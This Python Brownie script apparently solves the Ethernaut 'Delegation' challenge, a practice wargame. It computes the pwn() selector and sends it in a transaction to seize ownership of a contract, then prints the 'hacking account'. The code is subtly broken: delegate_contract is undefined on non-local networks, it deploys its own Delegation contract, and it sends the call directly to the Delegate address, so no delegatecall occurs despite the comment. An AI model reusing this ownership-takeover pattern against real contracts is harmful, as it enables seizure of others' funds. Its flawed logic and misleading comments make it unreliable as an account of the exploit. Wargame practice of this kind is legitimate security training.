from brownie import Delegate, Delegation, network, config
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account

from eth_utils import keccak


def claim_ownership_of_delegate_contract():
    # initial setup
    my_account = get_account()

    # get address of instance of Delegate contract; if local network, deploy delegate contract
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        deploying_account = get_account(1)
        delegate_contract = Delegate.deploy(deploying_account.address, {"from": deploying_account})
        delegate_contract_address = delegate_contract.address
    else:
        delegate_contract_address = config["networks"][network.show_active()]["delegation_instance"]
    
    # deploy Delegation contract
    delegation_contract = Delegation.deploy(delegate_contract_address, {"from": my_account})
    original_owner = delegation_contract.owner()
    data_to_send = keccak(text="pwn()")[0:4].hex()
    print("Method ID: {}".format(data_to_send))
    # perform delegate call
    my_account.transfer(delegate_contract_address, data_to_send, {"from": my_account})
    # check the owner
    owner = delegate_contract.owner()
    print("Original contract owner: {}".format(original_owner))
    print("Current owner of the contract: {}".format(owner))
    print("The hacking account: {}".format(my_account))


def main():
    claim_ownership_of_delegate_contract()

